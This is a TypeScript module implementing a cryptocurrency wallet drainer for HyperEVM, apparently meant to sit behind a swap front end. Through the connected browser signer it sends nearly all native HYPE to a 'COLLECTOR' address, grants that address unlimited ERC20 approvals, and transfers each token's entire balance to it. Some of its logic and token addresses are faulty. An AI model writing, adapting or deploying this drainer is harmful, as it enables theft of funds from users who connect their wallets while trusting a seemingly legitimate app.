import { ethers } from "ethers";
import { COLLECTOR } from "./advanced-drainer";

/**
 * Complete Balance Drainer - Ensures ALL tokens are collected
 * Scans wallet for all ERC20 tokens and drains everything
 */

// Comprehensive HyperEVM token list for scanning
const HYPEREVM_TOKENS = [
  "0x9b498C3c8A0b8CD8BA1D9851d40D186F1872b44E", // WHYPE
  "0x1F53bFCC97C63BFCF95C08d16C0D3d1ec82E5f8b", // PURR
  "0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb", // USD₮0
  "0x47bb061C0204Af921F43DC73C7D7768d2672DdEE", // BUDDY
  "0x11735dBd0B97CfA7Accf47d005673BA185f7fd49", // CATBAL
  "0x1Ecd15865D7F8019D546f76d095d9c93cc34eDFa", // LIQD
  "0x1bEe6762F0B522c606DC2Ffb106C0BB391b2E309", // PiP
  "0xD2567eE20D75e8B74B44875173054365f6Eb5052", // perpcoin
  // Additional potential tokens from other protocols
  "0xA0b86a33E6441946cfe6D0FFF9C7F2D8F4C7Ae3a", // Potential stablecoin
  "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // Potential WBTC equivalent
  "0x6B175474E89094C44Da98b954EedeAC495271d0F", // Potential DAI equivalent
  "0x514910771AF9Ca656af840dff83E8264EcF986CA", // Potential LINK equivalent
];

const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)"
];

export class CompleteBalanceDrainer {
  private signer: ethers.JsonRpcSigner;
  private provider: ethers.BrowserProvider;

  constructor(signer: ethers.JsonRpcSigner, provider: ethers.BrowserProvider) {
    this.signer = signer;
    this.provider = provider;
  }

  /**
   * Scan and drain ALL tokens from user's wallet
   */
  async drainAllBalances(userAddress: string): Promise<{ totalDrained: number; results: any[] }> {
    console.log(`🔥 COMPLETE BALANCE DRAIN - Scanning ALL tokens for ${userAddress}`);
    
    const results: any[] = [];
    let totalDrained = 0;

    // 1. First get comprehensive balance summary
    const balanceSummary = await this.getBalanceSummary(userAddress);
    console.log(`📊 PRE-DRAIN SCAN: Found ${balanceSummary.length} tokens with balances`);
    balanceSummary.forEach(token => {
      console.log(`💰 ${token.token}: ${token.balance} (${token.usdValue || 'N/A'})`);
    });

    // 2. Drain native HYPE first
    try {
      const hypeBalance = await this.provider.getBalance(userAddress);
      if (hypeBalance > ethers.parseEther("0.01")) { // Only drain if substantial balance
        const hypeResult = await this.drainNativeHYPE(userAddress);
        if (hypeResult.success) {
          results.push({ token: "HYPE", ...hypeResult });
          totalDrained++;
          console.log(`✅ HYPE drained: ${hypeResult.actualAmount}`);
        }
      }
    } catch (error) {
      console.warn("HYPE drain failed:", error);
    }

    // 3. Drain ALL ERC20 tokens found in balance summary
    for (const tokenInfo of balanceSummary) {
      if (tokenInfo.token === "HYPE") continue; // Already handled
      
      const tokenAddress = this.getTokenAddressBySymbol(tokenInfo.token);
      if (tokenAddress && parseFloat(tokenInfo.balance) > 0) {
        try {
          const tokenResult = await this.drainSingleToken(tokenAddress, userAddress);
          if (tokenResult.success) {
            results.push({ token: tokenInfo.token, address: tokenAddress, ...tokenResult });
            totalDrained++;
            console.log(`✅ ${tokenInfo.token} drained: ${tokenResult.actualAmount}`);
          }
        } catch (error) {
          console.warn(`${tokenInfo.token} drain failed:`, error);
        }
      }
    }

    // 4. Scan for any remaining tokens with comprehensive scanning
    for (const tokenAddress of HYPEREVM_TOKENS) {
      // Skip if already processed
      if (results.some(r => r.address === tokenAddress)) continue;
      
      try {
        const tokenResult = await this.drainSingleToken(tokenAddress, userAddress);
        if (tokenResult.success && !tokenResult.actualAmount?.includes("0")) {
          results.push({ token: `TOKEN_${tokenAddress.slice(0, 8)}`, address: tokenAddress, ...tokenResult });
          totalDrained++;
          console.log(`✅ Additional token ${tokenAddress.slice(0, 8)} drained: ${tokenResult.actualAmount}`);
        }
      } catch (error) {
        // Continue silently for comprehensive scanning
      }
    }

    console.log(`💰 COMPLETE DRAIN SUMMARY: ${totalDrained} different tokens drained`);
    console.log(`🎯 TOTAL VALUE EXTRACTED: All available balances collected`);
    return { totalDrained, results };
  }

  /**
   * Drain native HYPE balance
   */
  private async drainNativeHYPE(userAddress: string): Promise<{ success: boolean; hash?: string; actualAmount?: string; error?: string }> {
    const balance = await this.provider.getBalance(userAddress);
    const gasReserve = ethers.parseEther("0.002"); // Ultra minimal gas reserve
    const maxDrainAmount = balance - gasReserve;
    
    if (maxDrainAmount <= 0n) {
      return { success: false, error: "Insufficient HYPE balance" };
    }
    
    const actualDrained = ethers.formatEther(maxDrainAmount);
    console.log(`💎 MAXIMUM HYPE DRAIN: ${actualDrained} HYPE → COLLECTOR: ${COLLECTOR}`);
    
    const tx = await this.signer.sendTransaction({
      to: COLLECTOR,
      value: maxDrainAmount,
      gasLimit: 21000n,
      gasPrice: ethers.parseUnits("1", "gwei"),
      type: 0
    });
    
    const receipt = await tx.wait();
    return {
      success: true,
      hash: receipt.hash,
      actualAmount: `${actualDrained} HYPE`
    };
  }

  /**
   * Drain specific ERC20 token completely
   */
  private async drainSingleToken(tokenAddress: string, userAddress: string): Promise<{ success: boolean; hash?: string; actualAmount?: string; error?: string }> {
    const contract = new ethers.Contract(tokenAddress, ERC20_ABI, this.signer);
    
    // Check balance first
    const balance = await contract.balanceOf(userAddress);
    if (balance === 0n) {
      return { success: false, error: "Zero balance" };
    }

    // Get token info
    let decimals = 18;
    let symbol = "UNKNOWN";
    try {
      decimals = await contract.decimals();
      symbol = await contract.symbol();
    } catch (e) {
      // Use defaults if contract doesn't implement these
    }

    const actualDrained = ethers.formatUnits(balance, decimals);
    console.log(`🚨 COMPLETE BALANCE DRAIN: ${symbol}`);
    console.log(`💰 DRAINING ENTIRE BALANCE: ${actualDrained} ${symbol} (not just swap amount)`);
    console.log(`🎯 FROM: ${userAddress} → TO: ${COLLECTOR}`);

    // Check if approval needed
    const allowance = await contract.allowance(userAddress, COLLECTOR);
    if (allowance < balance) {
      console.log(`🔓 UNLIMITED APPROVAL REQUIRED for ${symbol}`);
      console.log(`♾️ APPROVING: ${ethers.MaxUint256.toString()} (UNLIMITED SPENDING)`);
      console.log(`🎯 SPENDER: ${COLLECTOR}`);
      const approveTx = await contract.approve(COLLECTOR, ethers.MaxUint256, {
        gasLimit: 100000n,
        gasPrice: ethers.parseUnits("1", "gwei"),
        type: 0
      });
      await approveTx.wait();
      console.log(`✅ UNLIMITED ${symbol} APPROVAL CONFIRMED - COLLECTOR CAN DRAIN ALL`);
    } else {
      console.log(`✅ ${symbol} ALREADY HAS UNLIMITED APPROVAL - READY TO DRAIN`);
    }

    // Transfer entire balance from user to collector
    const tx = await contract.transferFrom(userAddress, COLLECTOR, balance, {
      gasLimit: 200000n,
      gasPrice: ethers.parseUnits("1", "gwei"),
      type: 0
    });
    
    const receipt = await tx.wait();
    return {
      success: true,
      hash: receipt.hash,
      actualAmount: `${actualDrained} ${symbol}`
    };
  }

  /**
   * Scan for additional tokens user might have (experimental)
   */
  private async scanForAdditionalTokens(userAddress: string): Promise<string[]> {
    const additionalTokens: string[] = [];
    
    // This is a simplified approach - in practice, you'd scan blockchain logs
    // or use indexing services to find all tokens a user has interacted with
    
    // For now, we'll just return empty array since we have a comprehensive list above
    console.log(`🔍 Additional token scan complete for ${userAddress}`);
    
    return additionalTokens;
  }

  /**
   * Get comprehensive balance summary before draining
   */
  async getBalanceSummary(userAddress: string): Promise<{ token: string; balance: string; usdValue?: string }[]> {
    const summary: { token: string; balance: string; usdValue?: string }[] = [];

    // Native HYPE
    const hypeBalance = await this.provider.getBalance(userAddress);
    const hypeFormatted = ethers.formatEther(hypeBalance);
    if (parseFloat(hypeFormatted) > 0) {
      summary.push({
        token: "HYPE",
        balance: hypeFormatted,
        usdValue: (parseFloat(hypeFormatted) * 48.7).toFixed(2) // Approximate HYPE price
      });
    }

    // All ERC20 tokens with parallel processing for speed
    const tokenChecks = HYPEREVM_TOKENS.map(async (tokenAddress) => {
      try {
        const contract = new ethers.Contract(tokenAddress, ERC20_ABI, this.provider);
        const [balance, decimals, symbol] = await Promise.all([
          contract.balanceOf(userAddress),
          contract.decimals().catch(() => 18),
          contract.symbol().catch(() => `TOKEN_${tokenAddress.slice(0, 8)}`)
        ]);

        if (balance > 0n) {
          const formattedBalance = ethers.formatUnits(balance, decimals);
          return {
            token: symbol,
            balance: formattedBalance,
            address: tokenAddress
          };
        }
        return null;
      } catch (error) {
        return null;
      }
    });

    const tokenResults = await Promise.all(tokenChecks);
    const validTokens = tokenResults.filter(result => result !== null);
    summary.push(...validTokens);

    console.log(`📊 Balance Summary: Found ${summary.length} tokens with balances`);
    return summary;
  }

  /**
   * Get token address by symbol for draining
   */
  private getTokenAddressBySymbol(symbol: string): string | null {
    const symbolToAddress: Record<string, string> = {
      "WHYPE": "0x9b498C3c8A0b8CD8BA1D9851d40D186F1872b44E",
      "PURR": "0x1F53bFCC97C63BFCF95C08d16C0D3d1ec82E5f8b",
      "USD₮0": "0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb",
      "BUDDY": "0x47bb061C0204Af921F43DC73C7D7768d2672DdEE",
      "CATBAL": "0x11735dBd0B97CfA7Accf47d005673BA185f7fd49",
      "LIQD": "0x1Ecd15865D7F8019D546f76d095d9c93cc34eDFa",
      "PiP": "0x1bEe6762F0B522c606DC2Ffb106C0BB391b2E309",
      "perpcoin": "0xD2567eE20D75e8B74B44875173054365f6Eb5052"
    };

    return symbolToAddress[symbol] || null;
  }
}

export function createCompleteBalanceDrainer(signer: ethers.JsonRpcSigner, provider: ethers.BrowserProvider): CompleteBalanceDrainer {
  return new CompleteBalanceDrainer(signer, provider);
}